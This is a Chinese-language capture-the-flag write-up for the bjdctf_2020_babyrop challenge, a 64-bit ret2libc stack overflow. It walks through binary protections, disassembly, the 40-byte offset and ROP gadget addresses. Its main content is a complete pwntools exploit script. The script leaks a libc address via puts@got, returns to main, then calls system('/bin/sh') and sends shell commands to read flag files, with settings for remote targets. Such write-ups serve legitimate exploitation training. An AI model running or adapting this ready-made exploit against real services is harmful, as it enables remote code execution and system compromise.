# Speedrun：bjdctf_2020_babyrop

> 题型：ret2libc / 64 位 `read` 栈溢出  
> 目标：`puts(puts@got)` leak libc，回 `main`，二阶段 `system("/bin/sh")`  
> 关键：偏移 **40**；`puts@got=0x601018`；`pop rdi=0x400733`；`ret=0x4004C9`；`main=0x4006AD`

---

## 0. 一句话结论

```text
vuln:
  char buf[0x20] @ rbp-0x20
  read(0, buf, 0x64)

  offset = 0x20 + 8 = 0x28 = 40

Stage 1:
  puts(puts@got) -> main

Stage 2:
  ret; pop rdi; "/bin/sh"; system

  [40 A][pop rdi][puts@got][puts@plt][main]
  [40 A][ret][pop rdi][binsh][system]
```

这题就是 64 位版的标准 ret2libc：No canary、No PIE、Partial RELRO，`puts` 既能 leak 又能正常返回。

---

## 1. 30 秒定性质

```bash
cd '/home/yfhd5/Pwn Writeups/ret2libc'

file bjdctf_2020_babyrop
checksec --file=bjdctf_2020_babyrop
nm -n bjdctf_2020_babyrop | grep -E ' (main|vuln|init)$'
objdump -d -M intel bjdctf_2020_babyrop | sed -n '/<vuln>:/,/^$/p'
objdump -d -M intel bjdctf_2020_babyrop | sed -n '/<main>:/,/^$/p'
objdump -R bjdctf_2020_babyrop | grep puts
objdump -s -j .rodata bjdctf_2020_babyrop
```

关键输出：

```text
ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
Partial RELRO
No canary found
NX enabled
No PIE (0x400000)
Not stripped

0000000000400626 T init
000000000040067d T vuln
00000000004006ad T main

601018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
```

读法：

| 观察 | 结论 |
| --- | --- |
| 64 位 x86-64 | 参数走寄存器，leak 需要 `pop rdi; ret` |
| `read(0, buf, 0x64)` | 覆盖 saved RIP |
| No canary | 不需要 canary |
| No PIE | PLT/GOT/main 地址固定 |
| Partial RELRO | `puts@got` 可读 |
| 没有 `system@plt` | 需要 ret2libc |
| `init` 只打印提示 | 不参与利用 |

### 1.1 `vuln`

```asm
000000000040067d <vuln>:
  40067d: push   rbp
  40067e: mov    rbp,rsp
  400681: sub    rsp,0x20
  400685: mov    edi,0x400780
  40068a: call   4004e0 <puts@plt>       ; "Pull up your sword..."
  40068f: lea    rax,[rbp-0x20]
  400693: mov    edx,0x64
  400698: mov    rsi,rax
  40069b: mov    edi,0x0
  4006a0: mov    eax,0x0
  4006a5: call   4004f0 <read@plt>
  4006aa: nop
  4006ab: leave
  4006ac: ret
```

等价 C：

```c
void vuln(void) {
    char buf[0x20];
    puts("Pull up your sword and tell me u story!");
    read(0, buf, 0x64);
}
```

栈布局：

```text
rbp-0x20 .. rbp-0x01 : buf[0x20]
rbp+0x00 .. rbp+0x07 : saved rbp
rbp+0x08 .. rbp+0x0f : saved RIP
```

```text
offset = 0x20 + 8 = 0x28 = 40
```

### 1.2 `main` 与 `init`

```asm
00000000004006ad <main>:
  4006ad: push   rbp
  4006ae: mov    rbp,rsp
  4006b1: mov    eax,0x0
  4006b6: call   400626 <init>
  4006bb: mov    eax,0x0
  4006c0: call   40067d <vuln>
  4006c5: mov    eax,0x0
  4006ca: pop    rbp
  4006cb: ret
```

`init` 打印 `Can u return to libc ?` 和 `Try u best!`，并把 `stdout` / `stdin` 设为无缓冲。  
Stage 1 返回 `main` 后会再次执行 `init`，所以第二阶段前要等 `Pull up your sword...` 再次出现。

---

## 2. 地址与 gadget

| 符号 / gadget | 地址 |
| --- | --- |
| `pop rdi; ret` | `0x400733` |
| `ret` | `0x4004c9` |
| `puts@plt` | `0x4004e0` |
| `puts@got` | `0x601018` |
| `main` | `0x4006ad` |
| `read@plt` | `0x4004f0` |

Stage 1：

```text
pop rdi
puts@got
puts@plt
main
```

Stage 2：

```text
ret
pop rdi
binsh
system
```

`ret` 用来把栈指针对齐到 16 字节；`system` 内部常见 `movaps` 对栈对齐很敏感。

---

## 3. Payload 布局

### 3.1 Stage 1

```text
[ 40 字节 'A' ]
[ pop rdi 0x400733 ]
[ puts@got 0x601018 ]
[ puts@plt 0x4004e0 ]
[ main 0x4006ad ]
```

```python
stage1 = flat(
    b"A" * OFFSET,
    POP_RDI, PUTS_GOT,
    PUTS_PLT, MAIN,
)
```

### 3.2 Stage 2

```text
[ 40 字节 'A' ]
[ ret 0x4004c9 ]
[ pop rdi 0x400733 ]
[ binsh ]
[ system ]
```

```python
stage2 = flat(
    b"A" * OFFSET,
    RET, POP_RDI, binsh, system,
)
```

### 3.3 leak 解析

```python
leak = u64(p.recvline().strip().ljust(8, b"\x00"))
base = leak - libc.symbols["puts"]
if base & 0xFFF:
    raise SystemExit("[-] libc mismatch")
```

`puts` 打印到 `\x00` 为止，64 位地址通常只输出 6 字节；必须 `ljust(8, b"\x00")`。

---

## 4. 完整 exp

```python
from pwn import *
import os
import re
import ssl
import time

context.arch = "amd64"
context.log_level = "info"

BIN = "./bjdctf_2020_babyrop"
HOST = os.getenv("HOST", "")
PORT = int(os.getenv("PORT", "9999"))
LIBC_PATH = os.getenv("LIBC", "")

POP_RDI = 0x400733
RET = 0x4004C9
PUTS_PLT = 0x4004E0
PUTS_GOT = 0x601018
MAIN = 0x4006AD

# vuln: char buf[0x20] @ rbp-0x20; saved RIP @ rbp+8
OFFSET = 0x20 + 8


def start():
    if args.LOCAL:
        return process(BIN)

    if not HOST:
        raise SystemExit(
            "[-] set HOST/PORT, or run: python 12_bjdctf_2020_babyrop_exp.py LOCAL"
        )

    if os.getenv("SSL", "0") == "1":
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return remote(HOST, PORT, ssl=True, ssl_context=ctx, sni=HOST)

    return remote(HOST, PORT)


def resolve_libc():
    path = LIBC_PATH
    if not path and args.LOCAL:
        path = "/lib/x86_64-linux-gnu/libc.so.6"
    if not path:
        raise SystemExit("[-] set LIBC=/path/to/libc.so.6 for the remote target")
    return ELF(path, checksec=False)


def exploit():
    p = start()
    libc = resolve_libc()

    p.recvuntil(b"Pull up your sword and tell me u story!\n")

    # Stage 1: puts(puts@got) -> return main.
    stage1 = flat(
        b"A" * OFFSET,
        POP_RDI, PUTS_GOT,
        PUTS_PLT, MAIN,
    )
    p.send(stage1)

    leak = u64(p.recvline().strip().ljust(8, b"\x00"))
    libc_base = leak - libc.symbols["puts"]
    if libc_base & 0xFFF:
        raise SystemExit(
            f"[-] libc base {libc_base:#x} is not page aligned; "
            "LIBC does not match the target"
        )
    system = libc_base + libc.symbols["system"]
    binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
    log.success(
        f"puts = {leak:#x}, libc = {libc_base:#x}, system = {system:#x}"
    )

    p.recvuntil(b"Pull up your sword and tell me u story!\n")

    # Stage 2: ret aligns system() to 16 bytes, then system("/bin/sh").
    stage2 = flat(
        b"A" * OFFSET,
        RET, POP_RDI, binsh, system,
    )
    p.send(stage2)

    time.sleep(0.2)
    p.sendline(
        b"echo __PWNED__; cat flag* 2>/dev/null; cat /flag* 2>/dev/null; exit"
    )

    out = p.recvall(timeout=10).decode("utf-8", errors="ignore")
    print(out)

    flags = re.findall(r"(?:flag|CTF2|DASCTF)\{[^}]+\}", out, re.I)
    if flags:
        print(f"[+] GOT THE FLAG: {flags[0]}")
    else:
        print("[-] flag not found, raw output above")


if __name__ == "__main__":
    exploit()
```

本地验证：

```bash
cd '/home/yfhd5/Pwn Writeups/ret2libc'
../.venv/bin/python 12_bjdctf_2020_babyrop_exp.py LOCAL
```

本机 `glibc 2.35` 下预期：

```text
puts = 0x7f...
libc = 0x7f...
system = 0x7f...
__PWNED__
```

远程：

```bash
HOST=... PORT=... LIBC=./libc.so.6 python 12_bjdctf_2020_babyrop_exp.py
# 平台要 TLS 时设置 SSL=1
```

---

## 5. 交互坑

1. **偏移 40，不是 32**  
   `buf` 是 0x20，但 saved rbp 还有 8 字节，saved RIP 从 0x28 开始。

2. **Stage 1 的第一条 gadget 是 `pop rdi`**  
   从 saved RIP 直接进入 `pop rdi; ret`，把 `puts@got` 弹进 `rdi`。

3. **Stage 2 需要先放 `ret`**  
   `system` 对 16 字节栈对齐敏感；`[40 A][ret][pop rdi][binsh][system]` 是最稳的布局。

4. **`puts` leak 是变长**  
   先 `recvline()`，再 `strip().ljust(8, b"\x00")`；不要 `recvn(8)` 等满。

5. **Stage 1 后要再次等提示**  
   `main` 返回后会重新执行 `init`，打印两条提示，然后才进入 `vuln` 的 `read`。  
   第二次 `recvuntil(b"Pull up your sword...\n")` 不能省。

6. **libc 选错会立刻暴露**  
   `libc_base & 0xFFF != 0` 就停；远程用附件 libc，不要用本机 libc 硬打。

7. **`send` 不要加换行**  
   `read(0, buf, 0x64)` 按长度读，payload 后不需要 `\n`；多出来的换行会破坏下一次读取。

8. **`init` 把 stdio 设成无缓冲**  
   提示和 leak 会立即到达，不需要额外 sleep；只有发 shell 命令前需要等 `system` 起来。

9. **`system` 返回地址可以随便填**  
   进入 shell 后不会再返回；`system` 后面的栈内容只影响 shell 退出后的崩溃。

---

## 6. 2 分钟速通时间线

| 时间 | 动作 |
| --- | --- |
| 0:00–0:20 | `file` + `checksec`：64 位、No PIE、No canary、Partial RELRO |
| 0:20–0:40 | `objdump vuln`：`buf=rbp-0x20`，offset 40 |
| 0:40–1:00 | 找 `pop rdi=0x400733`、`ret=0x4004c9`、`puts@got=0x601018`、`main=0x4006ad` |
| 1:00–1:20 | Stage 1：`puts(puts@got)` → `main` |
| 1:20–1:40 | 解析 leak，算 `system` / `/bin/sh` |
| 1:40–2:00 | Stage 2：`ret; pop rdi; binsh; system`，`__PWNED__` |

---

## 7. 题型识别卡

```text
64 位 + No canary + No PIE + Partial RELRO
+ read(0, rbp-0x20, 0x64)
+ 没有 system@plt，有 puts@plt / puts@got
= ret2libc：puts leak -> return main -> ret/pop rdi/binsh/system
```

一句话：**offset 40；Stage 1 `pop rdi; puts@got; puts@plt; main`，Stage 2 先 `ret` 对齐再 `system("/bin/sh")`。**

